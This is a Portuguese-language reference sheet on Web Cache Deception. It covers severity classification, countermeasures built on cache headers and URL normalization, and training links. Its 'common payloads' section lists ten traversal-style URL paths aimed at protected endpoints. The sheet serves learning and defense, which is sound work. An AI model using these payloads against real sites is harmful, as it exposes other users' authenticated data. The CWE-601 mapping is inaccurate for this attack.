# Vulnerabilidade: Web Cache Deception (WCD)

## a) Estrutura Profissional
- **CVSS Score:** 7.5 (High) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- **OWASP Category:** A01:2021-Broken Access Control / A05:2021-Security Misconfiguration
- **CWE:** [CWE-601](https://cwe.mitre.org/data/definitions/601.html) (URL Redirection to Untrusted Site) / [CWE-524](https://cwe.mitre.org/data/definitions/524.html) (Information Exposure through Incorrect Cache)
- **Status:** Vulnerabilidade Crítica de Lógica de Negócios
- **Última atualização:** 2026-08-20

![Severity: High](https://img.shields.io/badge/Severity-High-red)
![Status: Active](https://img.shields.io/badge/Status-Active-green)

---

## b) Exemplos Práticos

### Payloads Comuns
1. `/user/profile/script.js/..%2f..%2f..%2f/secret`
2. `/static/..%2f..%2f..%2f/api/v1/user_data`
3. `/assets/style.css?foo=..%2f..%2f..%2f/profile`
4. `/images/logo.png/..%2f..%2f..%2f/admin/settings`
5. `/templates/login.html/..%2f..%2f..%2f/dashboard`
6. `/js/main.js/..%2f/config.json`
7. `/favicon.ico/..%2f/me`
8. `/css/app.css/..%2f/private/data`
9. `/public/img/test.jpg/..%2f..%2f/api/details`
10. `/static/app.bundle.js/..%2f..%2f/debug/info`

### Comparação: Vulnerável vs. Seguro
- **Vulnerável:** O servidor de cache confia na extensão `.js` ou no prefixo `/static/` e armazena a resposta, ignorando que o backend resolveu o `..%2f` para uma rota protegida.
- **Seguro:** A aplicação utiliza **Cache-Key normalization**, validando a URL final antes de permitir o cache, ou utilizando o header `Vary: Cookie` e `Cache-Control: private`.

---

## c) Contramedidas

### Prevenção em Código
- **Cache-Control Headers:** Utilize sempre `Cache-Control: private, no-store, no-cache`.
- **Validação de Path:** Implementar normalização de URL rigorosa no Web Application Firewall (WAF) e no Application Server.
- **Vary Header:** Garantir que o header `Vary: Authorization` ou `Vary: Cookie` esteja configurado para evitar que caches públicos guardem respostas autenticadas.

### Configuração Segura
- **Configuração de CDN:** Impedir o cache para extensões de arquivo que não sejam estáticas.
- **Desabilitar Cache de Borda:** Para rotas que processam autenticação ou dados sensíveis.

---

## d) Referências Citadas
1. [PortSwigger Academy - Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
2. [OWASP - Web Cache Deception](https://owasp.org/www-community/attacks/Web_Cache_Deception)
3. [HackTricks - Web Cache Deception](https://book.hacktricks.xyz/pentesting-web/web-cache-deception)
4. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
5. [CWE/CVE Database](https://cve.mitre.org/)

---

## e) Recursos Educacionais

### Roadmap & Plataformas
- **Roadmap:** Aprenda sobre HTTP Request Smuggling, CDN Cache Keys, e Normalização de URIs.
- **Plataformas de Prática:**
    - [TryHackMe](https://tryhackme.com/)
    - [HackTheBox](https://hackthebox.com/)
    - [PortSwigger Labs](https://portswigger.net/web-security)
    - [PentesterLab](https://pentesterlab.com/)
    - [VulnHub](https://www.vulnhub.com/)
- **Certificações:** OSCP, eWPTX, OSWE.
- **Comunidades:** Reddit r/netsec, Fóruns da OWASP, Discord de CTFs.
